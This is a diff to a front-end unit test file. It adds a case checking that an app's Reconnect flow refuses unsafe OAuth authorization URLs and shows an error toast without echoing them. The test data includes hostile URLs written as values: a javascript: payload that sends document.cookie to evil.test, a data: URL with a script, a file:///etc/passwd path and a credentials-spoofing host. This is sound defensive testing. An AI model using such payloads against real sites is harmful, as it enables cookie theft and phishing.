@@ -88,8 +88,9 @@ vi.mock("@/context/BreadcrumbContext", () => ({
   useBreadcrumbs: () => ({ setBreadcrumbs: vi.fn() }),
 }));
 
+const pushToastMock = vi.hoisted(() => vi.fn());
 vi.mock("@/context/ToastContext", () => ({
-  useToast: () => ({ pushToast: vi.fn() }),
+  useToast: () => ({ pushToast: pushToastMock }),
 }));
 
 // eslint-disable-next-line @typescript-eslint/no-explicit-any
@@ -244,7 +245,7 @@ describe("AppDetail", () => {
     startOAuthMock.mockResolvedValue({
       connectionId: "conn-1",
       provider: "smoke_lab",
-      authorizationUrl: "http://example.test/oauth",
+      authorizationUrl: "https://example.test/oauth",
       expiresAt: "2026-07-10T00:00:00.000Z",
     });
   });
@@ -795,6 +796,47 @@ describe("AppDetail", () => {
     await flushReact();
 
     expect(startOAuthMock).toHaveBeenCalledWith("conn-1");
-    expect(navigateTopLevelMock).toHaveBeenCalledWith("http://example.test/oauth");
+    expect(navigateTopLevelMock).toHaveBeenCalledWith("https://example.test/oauth");
+  });
+
+  /**
+   * PAP-17099 — the server refuses to hand out an unsafe authorization endpoint,
+   * but this is the boundary where one would actually execute, so the board must
+   * refuse it independently of what the response body says.
+   */
+  it.each([
+    ["javascript:", "javascript:fetch('https://evil.test/'+document.cookie)"],
+    ["data:", "data:text/html,<script>alert(document.domain)</script>"],
+    ["file:", "file:///etc/passwd"],
+    ["plaintext http", "http://evil.test/authorize"],
+    ["credentials", "https://accounts.example.test@evil.test/authorize"],
+  ])("never navigates to a %s authorization url", async (_label, authorizationUrl) => {
+    mockParams.tab = "permissions";
+    getConnectionMock.mockResolvedValue(connection({
+      authKind: "oauth",
+      healthStatus: "failed",
+      healthMessage: "Authorization expired (invalid_grant).",
+    }));
+    startOAuthMock.mockResolvedValue({
+      connectionId: "conn-1",
+      provider: "generic",
+      authorizationUrl,
+      expiresAt: "2026-07-10T00:00:00.000Z",
+    });
+
+    await renderAppDetail();
+    await act(async () => {
+      Array.from(container.querySelectorAll("button"))
+        .find((button) => button.textContent?.trim() === "Reconnect")
+        ?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
+    });
+    await flushReact();
+
+    expect(navigateTopLevelMock).not.toHaveBeenCalled();
+    expect(pushToastMock).toHaveBeenCalledWith(expect.objectContaining({ tone: "error" }));
+    // The refusal explains itself without echoing the hostile URL back into the DOM.
+    const body = String(pushToastMock.mock.calls.at(-1)?.[0]?.body ?? "");
+    expect(body.length).toBeGreaterThan(0);
+    expect(body).not.toContain(authorizationUrl);
   });
 });
